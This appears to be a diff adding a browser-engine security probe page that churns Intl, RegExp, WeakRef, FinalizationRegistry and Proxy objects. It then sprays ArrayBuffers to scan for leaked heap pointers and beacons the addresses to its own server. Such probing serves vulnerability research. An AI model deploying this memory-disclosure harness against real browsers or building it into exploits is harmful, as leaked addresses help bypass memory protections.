@@ -1,0 +1,348 @@
+<!--
+  p786: Intl API / RegExp compilation / WeakRef / FinalizationRegistry residue
+
+  Intl objects (NumberFormat, DateTimeFormat, Collator, PluralRules,
+  ListFormat, RelativeTimeFormat, Segmenter) each create C++ ICU
+  backing objects with locale data, pattern caches, and formatter
+  state. These are heavyweight allocations from the ICU library's
+  own heap. Creating many formatters with varied locales and options
+  exercises ICU's internal allocators, which are separate from
+  bmalloc and may not zero-initialize freed memory.
+
+  RegExp compilation: new RegExp() with complex patterns triggers
+  YARR bytecode or JIT compilation. Each compiled pattern allocates
+  C++ BytecodePattern or JITCode objects. The pattern cache holds
+  recent compilations. Creating many distinct patterns and letting
+  them be GC'd exercises the YARR allocator.
+
+  WeakRef: new WeakRef(target) creates a C++ weak reference cell
+  that the GC tracks. deref() reads through the cell. Creating
+  many WeakRefs and letting targets be collected exercises the
+  GC's weak reference processing path.
+
+  FinalizationRegistry: registers C++ weak reference cells with
+  cleanup callbacks. When targets are collected, the registry
+  queues C++ CleanupRecord objects for microtask execution.
+  Many registrations + GC pressure exercises the cleanup queue.
+
+  Proxy/Reflect: Proxy objects create C++ JSProxy wrappers with
+  handler trap references. Each trap invocation goes through a
+  C++ dispatch path that allocates trap result objects.
+
+  Attack angles:
+  A) Intl.NumberFormat/DateTimeFormat with varied locales.
+  B) RegExp compilation with complex patterns then GC.
+  C) WeakRef create/deref/collect cycles.
+  D) FinalizationRegistry cleanup queue residue.
+  E) Proxy trap dispatch residue.
+  F) Intl.Collator/Segmenter locale data residue.
+
+  CRASH_CLASS: LOW (Intl/regexp/GC APIs, no side effects)
+  prior art: p782 (Promise/Map/Set), p630 (DFG type confusion)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p786</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p786-START');
+
+// === Section A: Intl.NumberFormat/DateTimeFormat varied locales ===
+try{
+  b('A-intl-format');
+  var aHits=0;
+
+  var locales=['en-US','ja-JP','zh-CN','ar-SA','de-DE','fr-FR','ko-KR',
+    'ru-RU','pt-BR','hi-IN','th-TH','vi-VN','he-IL','fa-IR','tr-TR'];
+
+  for(var round=0;round<3;round++){
+    (function(){
+      var formatters=[];
+
+      for(var li=0;li<locales.length;li++){
+        for(var i=0;i<5;i++){
+          try{
+            var nf=new Intl.NumberFormat(locales[li],{
+              style:i%3===0?'currency':i%3===1?'percent':'decimal',
+              currency:i%3===0?'USD':undefined,
+              minimumFractionDigits:i,
+              maximumFractionDigits:i+2,
+              useGrouping:true
+            });
+            nf.format(12345.6789);
+            nf.format(-98765.4321);
+            formatters.push(nf);
+          }catch(e){}
+
+          try{
+            var df=new Intl.DateTimeFormat(locales[li],{
+              year:'numeric',
+              month:i%3===0?'long':i%3===1?'short':'numeric',
+              day:'numeric',
+              hour:i>2?'numeric':undefined,
+              minute:i>2?'numeric':undefined,
+              timeZone:i%2===0?'UTC':'America/New_York'
+            });
+            df.format(new Date());
+            df.format(new Date(2020,0,1));
+            formatters.push(df);
+          }catch(e){}
+        }
+      }
+
+      if(round===0)b('A created '+formatters.length+' Intl formatters across '+locales.length+' locales');
+      formatters=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[48,64,96,128,192]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: RegExp compilation with complex patterns ===
+try{
+  b('B-regexp');
+  var bHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var regexps=[];
+
+      for(var i=0;i<100;i++){
+        try{
+          var pattern;
+          switch(i%5){
+            case 0: pattern='(?:abc|def|ghi){2,5}[a-zA-Z0-9_]+\\b'; break;
+            case 1: pattern='(\\d{1,3}\\.){3}\\d{1,3}(?::\\d{2,5})?'; break;
+            case 2: pattern='(?=.*[A-Z])(?=.*[a-z])(?=.*\\d).{'+i+',}'; break;
+            case 3: pattern='(?:(?:[a-z]+_){'+((i%10)+1)+'}){2}[a-z]+'; break;
+            case 4: pattern='[\\u0000-\\u007F]+|[\\u0080-\\uFFFF]+'; break;
+          }
+          var flags='g';
+          if(i%3===0)flags+='i';
+          if(i%4===0)flags+='m';
+
+          var re=new RegExp(pattern,flags);
+          re.test('test_string_'+i+'_abc_DEF_123_ghi_JKL_456');
+          re.exec('match_target_'+round+'_192.168.1.'+i+':8080');
+          regexps.push(re);
+        }catch(e){}
+      }
+
+      if(round===0)b('B compiled '+regexps.length+' regexp patterns');
+      regexps=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[32,48,64,96]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: WeakRef create/deref/collect ===
+try{
+  b('C-weakref');
+  var cHits=0;
+
+  var wrSupported=typeof WeakRef!=='undefined';
+  if(!wrSupported){
+    b('C-SKIP no WeakRef');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var refs=[];
+        for(var i=0;i<200;i++){
+          var target={id:i,round:round,data:'weakref_target_'+'w'.repeat(30+i%20)};
+          var wr=new WeakRef(target);
+          refs.push(wr);
+        }
+
+        if(round===0){
+          b('C created '+refs.length+' WeakRefs');
+          var alive=0;
+          for(var i=0;i<refs.length;i++){
+            if(refs[i].deref()!==undefined)alive++;
+          }
+          b('C alive before GC='+alive);
+        }
+
+        // Drop targets, let GC reclaim
+        refs=null;
+      })();
+
+      // Pressure GC
+      for(var i=0;i<5000;i++){var tmp=new ArrayBuffer(128);}
+
+      cHits+=sprayAndScan('C',round,[32,48,64,96]);
+    }
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: FinalizationRegistry cleanup queue ===
+try{
+  b('D-finreg');
+  var dHits=0;
+
+  var frSupported=typeof FinalizationRegistry!=='undefined';
+  if(!frSupported){
+    b('D-SKIP no FinalizationRegistry');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var cleanupCount=0;
+        var registry=new FinalizationRegistry(function(heldValue){
+          cleanupCount++;
+        });
+
+        for(var i=0;i<200;i++){
+          var target={id:i,data:'finreg_'+round+'_'+i+'_'+'f'.repeat(20)};
+          registry.register(target,'held_'+round+'_'+i);
+        }
+
+        if(round===0)b('D registered 200 targets in FinalizationRegistry');
+      })();
+
+      // Pressure GC heavily to trigger cleanup
+      for(var i=0;i<8000;i++){var tmp=new ArrayBuffer(64);}
+
+      dHits+=sprayAndScan('D',round,[32,48,64,96,128]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: Proxy trap dispatch residue ===
+try{
+  b('E-proxy');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var proxies=[];
+
+      for(var i=0;i<50;i++){
+        var target={a:1,b:'hello',c:[1,2,3],d:{nested:true}};
+        var handler={
+          get:function(t,p,r){return t[p];},
+          set:function(t,p,v,r){t[p]=v;return true;},
+          has:function(t,p){return p in t;},
+          deleteProperty:function(t,p){delete t[p];return true;},
+          ownKeys:function(t){return Object.keys(t);},
+          getOwnPropertyDescriptor:function(t,p){return Object.getOwnPropertyDescriptor(t,p);}
+        };
+        var proxy=new Proxy(target,handler);
+
+        // Exercise all traps
+        var v=proxy.a;
+        proxy.newProp='value_'+round+'_'+i;
+        var h=('b' in proxy);
+        delete proxy.newProp;
+        var keys=Object.keys(proxy);
+        var desc=Object.getOwnPropertyDescriptor(proxy,'a');
+
+        proxies.push(proxy);
+      }
+
+      if(round===0)b('E created '+proxies.length+' proxies, exercised 6 traps each');
+      proxies=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: Intl.Collator/Segmenter locale data ===
+try{
+  b('F-intl-collator');
+  var fHits=0;
+
+  var locales=['en','ja','zh','ar','de','fr','ko','ru','pt','hi','th','vi','he','tr','pl'];
+
+  for(var round=0;round<3;round++){
+    (function(){
+      var collators=[];
+
+      for(var li=0;li<locales.length;li++){
+        for(var i=0;i<5;i++){
+          try{
+            var col=new Intl.Collator(locales[li],{
+              sensitivity:['base','accent','case','variant'][i%4],
+              usage:i%2===0?'sort':'search',
+              numeric:i>2
+            });
+            col.compare('abc','def');
+            col.compare('hello_'+round,'world_'+i);
+            collators.push(col);
+          }catch(e){}
+        }
+
+        try{
+          var pr=new Intl.PluralRules(locales[li],{type:'ordinal'});
+          pr.select(0);pr.select(1);pr.select(2);pr.select(5);pr.select(11);pr.select(21);
+          collators.push(pr);
+        }catch(e){}
+
+        if(typeof Intl.Segmenter!=='undefined'){
+          try{
+            var seg=new Intl.Segmenter(locales[li],{granularity:'word'});
+            var segments=seg.segment('Hello world test string for segmentation');
+            for(var s of segments){}
+            collators.push(seg);
+          }catch(e){}
+        }
+
+        if(typeof Intl.ListFormat!=='undefined'){
+          try{
+            var lf=new Intl.ListFormat(locales[li],{style:'long',type:'conjunction'});
+            lf.format(['apple','banana','cherry']);
+            collators.push(lf);
+          }catch(e){}
+        }
+      }
+
+      if(round===0)b('F created '+collators.length+' Intl objects (Collator/PluralRules/Segmenter/ListFormat)');
+      collators=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[48,64,96,128,192]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p786-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
